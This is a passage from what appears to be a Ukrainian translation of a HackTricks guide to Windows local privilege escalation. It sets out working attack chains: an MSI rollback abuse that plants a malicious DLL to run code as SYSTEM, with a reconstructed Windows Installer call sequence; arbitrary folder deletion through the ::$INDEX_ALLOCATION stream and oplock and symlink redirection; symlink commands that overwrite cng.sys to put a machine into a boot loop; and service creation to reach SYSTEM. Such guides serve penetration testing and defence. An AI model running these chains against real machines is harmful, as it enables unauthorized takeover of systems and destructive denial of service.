Після `MsiBeginTransactionW` метод `SetEEUIDirectoryAndFilter` додає шлях до списку як папку, незалежно від аргументу фільтра, переданого клієнтом. Служба записує іменоване значення `REG_DWORD` у `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: ім’я значення — це контрольований клієнтом шлях, а дані `0x00000002` — прапорець папки. Після цього `CleanupTempPackages(NULL, FALSE)` одразу запускає очищення. Його привілейований робочий процес перелічує значення реєстру й передає записи папок рекурсивній функції `FDeleteFolder`, не перевіряючи походження шляхів. Якщо звичайне видалення не вдається, код також викликає `LockdownPath`, очищує атрибути файлу й повторює спробу.<sup>[[41]](#references)</sup>

Мінімальна послідовність викликів, відновлена з `msi.dll`:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Корисний примітив — повторне використання шляху, а не перенаправлення через junction. Зареєструйте створений атакувальником `C:\Config.Msi`, видаліть його й дочекайтеся, поки Windows Installer згодом відтворить той самий шлях із захищеними даними для rollback. Під час очищення система довіряє застарілому імені `TempPackages` і видаляє нову директорію від імені SYSTEM. Це обходить передбачений захист `FILE_FLAG_OPEN_REPARSE_POINT` і механізм пом’якшення ризику через довіру до перенаправлення, оскільки reparse point не потрібен.<sup>[[41]](#references)</sup>

Цей примітив видалення підходить для наведеного нижче ланцюжка rollback: збережіть окремий запис `Installer\Folders`, видаліть захищений `C:\Config.Msi`, відтворіть його з NULL DACL і збережіть handle, відкритий із правом `WRITE_DAC` до того, як installer захистить DACL. Попередньо відкритий handle може відновити дозвільну DACL за допомогою `NtSetSecurityObject`, після чого згенерований `.rbs` можна замінити до продовження rollback.<sup>[[41]](#references)</sup>

Microsoft виправила цю проблему, заборонивши `CMsiTransaction::SetEEUIDirectoryAndFilter` викликати `ScheduleFileOrFolderDelete`, коли ввімкнено новий feature gate. COM-виклик усе ще може повертати успіх, але шлях, контрольований атакувальником, більше не додається до `TempPackages`. Застосуйте оновлення безпеки Windows за квітень 2025 року, а не використовуйте успішне повернення методу як перевірку наявності виправлення.<sup>[[41]](#references)[[42]](#references)</sup>

Узагальнена техніка така:

1. **Етап 1 – Підготовка до перехоплення (залиште `C:\Config.Msi` порожньою)**

- Крок 1: Інсталюйте MSI
    - Створіть `.msi`, який інсталює нешкідливий файл (наприклад, `dummy.txt`) у директорію з правом запису (`TARGETDIR`).
    - Позначте installer як **"UAC Compliant"**, щоб його міг запустити **користувач без прав адміністратора**.
    - Залиште **handle** відкритим до файлу після інсталяції.

- Крок 2: Почніть видалення
    - Видаліть той самий `.msi`.
    - Процес видалення почне переміщати файли до `C:\Config.Msi` і перейменовувати їх на файли `.rbf` (резервні копії для rollback).
    - **Опитуйте відкритий file handle** за допомогою `GetFinalPathNameByHandle`, щоб визначити, коли файл стане `C:\Config.Msi\<random>.rbf`.

- Крок 3: Синхронізація
    - `.msi` містить **спеціальну дію видалення (`SyncOnRbfWritten`)**, яка:
        - Сигналізує, коли файл `.rbf` записано.
        - Потім **чекає** на іншу подію, перш ніж продовжити видалення.

- Крок 4: Заблокуйте видалення `.rbf`
    - Після отримання сигналу **відкрийте файл `.rbf`** без `FILE_SHARE_DELETE` — це **не дасть його видалити**.
    - Потім **надішліть сигнал у відповідь**, щоб видалення завершилося.
    - Windows Installer не зможе видалити `.rbf`, а оскільки він не може видалити весь вміст, **`C:\Config.Msi` не буде видалено**.

- Крок 5: Видаліть `.rbf` вручну
    - Ви (атакувальник) вручну видаляєте файл `.rbf`.
    - Тепер **`C:\Config.Msi` порожня** й готова до перехоплення.

> На цьому етапі **скористайтеся вразливістю видалення довільної директорії з рівнем SYSTEM**, щоб видалити `C:\Config.Msi`.

2. **Етап 2 – Заміна rollback-скриптів на шкідливі**

- Крок 6: Відтворіть `C:\Config.Msi` зі слабкими ACL
    - Самостійно відтворіть директорію `C:\Config.Msi`.
    - Установіть **слабкі DACL** (наприклад, Everyone:F) і **залиште відкритим handle** із правом `WRITE_DAC`.

- Крок 7: Запустіть іншу інсталяцію
    - Знову інсталюйте `.msi`, указавши:
        - `TARGETDIR`: місце з правом запису.
        - `ERROROUT`: змінну, яка спричиняє примусову помилку.
    - Ця інсталяція потрібна, щоб знову запустити **rollback**, який читає `.rbs` і `.rbf`.

- Крок 8: Відстежуйте появу `.rbs`
    - За допомогою `ReadDirectoryChangesW` стежте за `C:\Config.Msi`, доки там не з’явиться новий `.rbs`.
    - Збережіть його ім’я.

- Крок 9: Синхронізуйтеся перед rollback
    - `.msi` містить **спеціальну дію інсталяції (`SyncBeforeRollback`)**, яка:
        - Сигналізує про створення `.rbs`.
        - Потім **чекає**, перш ніж продовжити.

- Крок 10: Повторно застосуйте слабкі ACL
    - Після отримання події `.rbs created`:
        - Windows Installer **повторно застосовує сильні ACL** до `C:\Config.Msi`.
        - Але оскільки у вас усе ще є handle із правом `WRITE_DAC`, ви можете **знову застосувати слабкі ACL**.

> ACL **перевіряються лише під час відкриття handle**, тож ви все ще можете записувати в директорію.

- Крок 11: Розмістіть підроблені `.rbs` і `.rbf`
    - Перезапишіть файл `.rbs` **підробленим rollback-скриптом**, який указує Windows:
        - Відновити ваш файл `.rbf` (шкідливу DLL) у **привілейованому місці** (наприклад, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Розмістіть підроблений `.rbf` зі **шкідливим DLL payload рівня SYSTEM**.

- Крок 12: Запустіть rollback
    - Надішліть сигнал події синхронізації, щоб installer продовжив роботу.
    - **Спеціальна дія типу 19 (`ErrorOut`)** налаштована на **навмисний збій інсталяції** в заздалегідь визначений момент.
    - Це запускає **rollback**.

- Крок 13: SYSTEM інсталює вашу DLL
    - Windows Installer:
        - Читає ваш шкідливий `.rbs`.
        - Копіює вашу DLL із `.rbf` у цільове місце.
    - Тепер ваша **шкідлива DLL розміщена за шляхом, із якого її завантажує SYSTEM**.

- Завершальний крок: Виконайте код від імені SYSTEM
    - Запустіть довірений **автоматично підвищений бінарний файл** (наприклад, `osk.exe`), який завантажує перехоплену вами DLL.
    - **Готово**: ваш код виконується **від імені SYSTEM**.


### Від довільного видалення/переміщення/перейменування файлу до SYSTEM EoP

Основна техніка MSI rollback (попередня) передбачає, що ви можете видалити **цілу директорію** (наприклад, `C:\Config.Msi`). Але що, якщо ваша вразливість дозволяє лише **довільне видалення файлів**?

Можна використати **внутрішні механізми NTFS**: кожна директорія має прихований alternate data stream із назвою:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Цей потік зберігає **метадані індексу** папки.

Тому, якщо **видалити потік `::$INDEX_ALLOCATION`** папки, NTFS **видалить всю папку** з файлової системи.

Це можна зробити за допомогою стандартних API для видалення файлів, наприклад:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Хоча ви викликаєте API видалення *файлу*, воно **видаляє саму папку**.

### Від видалення вмісту папки до SYSTEM EoP
Що, якщо ваша примітива не дозволяє видаляти довільні файли/папки, але **дозволяє видаляти *вміст* папки, контрольованої зловмисником**?

1. Крок 1: Створіть папку-приманку та файл
- Створіть: `C:\temp\folder1`
- Усередині неї: `C:\temp\folder1\file1.txt`

2. Крок 2: Встановіть **oplock** на `file1.txt`
- **Oplock** призупиняє виконання, коли привілейований процес намагається видалити `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Крок 3: Запустіть процес SYSTEM (наприклад, `SilentCleanup`)
- Цей процес сканує папки (наприклад, `%TEMP%`) і намагається видалити їхній вміст.
- Коли він доходить до `file1.txt`, **спрацьовує oplock** і передає керування вашому callback.

4. Крок 4: Усередині callback oplock — перенаправте видалення

- Варіант A: Перемістіть `file1.txt` в інше місце
    - Це звільнить `folder1`, не порушуючи oplock.
    - Не видаляйте `file1.txt` безпосередньо — це передчасно звільнить oplock.

- Варіант B: Перетворіть `folder1` на **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Варіант C: Створіть **symlink** у `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Це націлено на внутрішній потік NTFS, у якому зберігаються метадані папки, — його видалення видаляє папку.

5. Крок 5: Зняти oplock
- Процес SYSTEM продовжує роботу й намагається видалити `file1.txt`.
- Але тепер через junction + symlink він фактично видаляє:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Результат**: `C:\Config.Msi` видаляється від імені SYSTEM.

### Від створення папки в довільному місці до постійного DoS

Скористайтеся примітивом, який дає змогу **створити довільну папку від імені SYSTEM/admin** — навіть якщо **ви не можете записувати файли** або **встановлювати слабкі дозволи**.

Створіть **папку** (не файл) з назвою **критично важливого драйвера Windows**, наприклад:
```
C:\Windows\System32\cng.sys
```

- Цей шлях зазвичай відповідає драйверу режиму ядра `cng.sys`.
- Якщо **заздалегідь створити його як папку**, Windows не зможе завантажити справжній драйвер під час запуску.
- Після цього Windows спробує завантажити `cng.sys` під час запуску.
- Вона побачить папку, **не зможе знайти справжній драйвер** і **аварійно завершить роботу або зупинить завантаження**.
- **Резервного варіанта немає**, і **відновлення без зовнішнього втручання** (наприклад, відновлення завантаження або доступу до диска) **неможливе**.

### Від привілейованих шляхів для журналів/резервних копій і OM symlinks до перезапису довільних файлів / DoS під час завантаження

Якщо **привілейована служба** записує журнали/експорти за шляхом, прочитаним із **доступного для запису конфігураційного файла**, перенаправте цей шлях за допомогою **Object Manager symlinks + точок монтування NTFS**, щоб перетворити привілейований запис на перезапис довільного файла (навіть **без SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Вимоги**
- Конфігураційний файл, у якому зберігається цільовий шлях, доступний для запису зловмиснику (наприклад, `%ProgramData%\...\.ini`).
- Можливість створити точку монтування для `\RPC Control` і файловий OM symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Привілейована операція, яка записує за цим шляхом (журнал, експорт, звіт).

**Приклад ланцюжка**
1. Прочитайте конфігураційний файл, щоб визначити привілейоване розташування журналу, наприклад `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` у `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Перенаправте шлях без прав адміністратора:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Дочекайтеся, поки привілейований компонент запише журнал (наприклад, адміністратор натисне «надіслати тестове SMS»). Тепер дані записуються в `C:\Windows\System32\cng.sys`.
4. Перевірте перезаписаний файл (hex/PE parser), щоб підтвердити пошкодження; перезавантаження змушує Windows завантажити підмінений драйвер → **boot loop DoS**. Це також застосовно до будь-якого захищеного файлу, який привілейована служба відкриває для запису.

> `cng.sys` зазвичай завантажується з `C:\Windows\System32\drivers\cng.sys`, але якщо копія є в `C:\Windows\System32\cng.sys`, її можуть спробувати завантажити першою, що робить її надійним місцем для DoS за допомогою пошкоджених даних.



## **Від High Integrity до System**

### **New service**

Якщо ви вже працюєте в процесі з High Integrity, **шлях до SYSTEM** може бути простим — достатньо **створити й запустити нову службу**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Під час створення бінарного файлу служби переконайтеся, що це дійсна служба або що бінарний файл швидко виконує необхідні дії, оскільки його буде завершено через 20 секунд, якщо це не дійсна служба.

### AlwaysInstallElevated

Із процесу High Integrity можна спробувати **увімкнути записи реєстру AlwaysInstallElevated** і **встановити** reverse shell за допомогою обгортки _**.msi**_.\
[Більше інформації про задіяні ключі реєстру та встановлення пакета _.msi_ тут.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Ви можете** [**знайти код тут**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Якщо у вас є ці привілеї токена (імовірно, ви знайдете їх у вже наявному процесі High Integrity), ви зможете **відкрити майже будь-який процес** (крім захищених процесів), використовуючи привілей SeDebug, **скопіювати токен** процесу та створити **довільний процес із цим токеном**.\
Зазвичай для цієї техніки **вибирають будь-який процес, запущений від SYSTEM з усіма привілеями токена** (_так, можна знайти процеси SYSTEM без усіх привілеїв токена_).\
**Приклад коду, що реалізує запропоновану техніку, можна знайти** [**тут**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Цю техніку використовує meterpreter для підвищення привілеїв у `getsystem`. Вона полягає у **створенні pipe, а потім створенні/використанні служби для запису в цей pipe**. Після цього **сервер**, який створив pipe за допомогою привілею **`SeImpersonate`**, зможе **імперсонувати токен** клієнта pipe (служби) й отримати привілеї SYSTEM.\
Щоб [**дізнатися більше про name pipes, прочитайте це**](#named-pipe-client-impersonation).\
Приклад того, [**як перейти від High Integrity до System за допомогою name pipes, наведено тут**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Якщо вам вдасться **виконати hijack dll**, яку **завантажує** **процес**, запущений від **SYSTEM**, ви зможете виконати довільний код із цими правами. Тому Dll Hijacking також корисний для такого підвищення привілеїв; крім того, його **набагато легше виконати з процесу High Integrity**, оскільки той матиме **права на запис** у папки, що використовуються для завантаження dll.\
**Дізнатися більше про Dll hijacking можна** [**тут**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Читайте:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Статичні бінарні файли impacket](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Перевіряє помилки конфігурації та чутливі файли (**[**див. тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Виявляється.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Перевіряє наявність можливих помилок конфігурації та збирає інформацію (**[**див. тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Перевіряє помилки конфігурації**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Витягує збережену інформацію про сеанси PuTTY, WinSCP, SuperPuTTY, FileZilla та RDP. Використовуйте -Thorough локально.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Витягує облікові дані з Credential Manager. Виявляється.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Виконує password spray зібраними паролями в домені**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh — це інструмент PowerShell для підміни ADIDNS/LLMNR/mDNS і атаки man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Базова Windows-інвентаризація для privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Пошук відомих вразливостей privesc (ЗАСТАРІЛИЙ, використовуйте Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Локальні перевірки **(потрібні права адміністратора)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Пошук відомих вразливостей privesc (потрібно скомпілювати за допомогою VisualStudio) ([**скомпільований файл**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Перевіряє хост на наявність помилок конфігурації (більше інструмент для збору інформації, ніж для privesc) (потрібно скомпілювати) **(**[**скомпільований файл**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Витягує облікові дані з багатьох програм (скомпільований exe у github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Порт PowerUp на C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Перевірка помилок конфігурації (скомпільований виконуваний файл у github). Не рекомендовано. Погано працює у Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Перевірка можливих помилок конфігурації (exe на Python). Не рекомендовано. Погано працює у Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Інструмент, створений на основі цієї публікації (для належної роботи йому не потрібен accesschk, але він може його використовувати).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Читає вивід **systeminfo** та рекомендує робочі експлойти (локальний Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Читає вивід **systeminfo** та рекомендує робочі експлойти (локальний Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Потрібно скомпілювати проєкт, використовуючи відповідну версію .NET ([див. тут](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Щоб переглянути встановлену на хості жертви версію .NET, виконайте:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Основи підвищення привілеїв у Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Підвищення привілеїв через використання слабких дозволів на папки](http://www.greyhathacker.net/?p=738)
- [3] [Підвищення привілеїв у Windows — шпаргалка](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop — практикум із локального підвищення привілеїв у Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 — атаки на Windows: AT — новий хіт (Rob Fuller і Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Підвищення привілеїв — Windows — повний посібник з OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows — підвищення привілеїв — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Посібник із підвищення привілеїв у Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Контрольний список підвищення привілеїв у Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Підвищення привілеїв у Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Методи підвищення привілеїв у Windows для пентестерів](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf — HTB/VulnLab JobTwo: фішинг через макрос Word VBA і SMTP → розшифрування облікових даних hMailServer → CVE-2023-27532 у Veeam для отримання SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak через format string + stack BOF → VirtualAlloc ROP (RCE) і викрадення kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research — Полювання на Silver Fox: гра в кішки-мишки в тінях ядра](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 — Уразливість файлової системи з підвищеними привілеями в системі SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Інструменти тестування символічних посилань — використання CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Посилання в минуле. Зловживання символічними посиланнями у Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [Прощавай, RegPwn — MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (порт BOF для Cobalt Strike)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI — Node.js: довіра з ризиком. Небезпечне розв’язання модулів у Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Модулі Node.js: завантаження з папок `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits — завдання з контрольного списку C/C++, розв’язання](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn — функція RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery — NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone — CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone — перехоплення бінарних файлів служб](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own із Microslop: ланцюжок CLDFLT і race condition у ядрі DirectX для локального підвищення привілеїв у Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Одне кільце I/O, щоб керувати ними всіма: примітив повного читання/запису у Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Зловживання довільним видаленням файлів для підвищення привілеїв та інші корисні трюки](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC — код експлойта FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure — атаки на WSUS, частина 2: CVE-2020-1013, одноденна уразливість локального підвищення привілеїв у Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: огляд Credential Manager і Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n — PoC CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com — делегування Kerberos Resource-Based Constrained Delegation: як зміна образу призводить до підвищення привілеїв](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com — вилучення приватних SSH-ключів з агента SSH у Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps — перетворення серверів оновлень підприємства на фабрики бекдорів (0_o) — частина 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps — перетворення серверів оновлень підприємства на фабрики бекдорів (0_o) — частина 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s — NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence — підвищення привілеїв через видалення папки Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center — CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec — Total Recall: відстеження шляху назад до NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group — рекомендації щодо підвищення привілеїв через зсуви спільної пам’яті Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
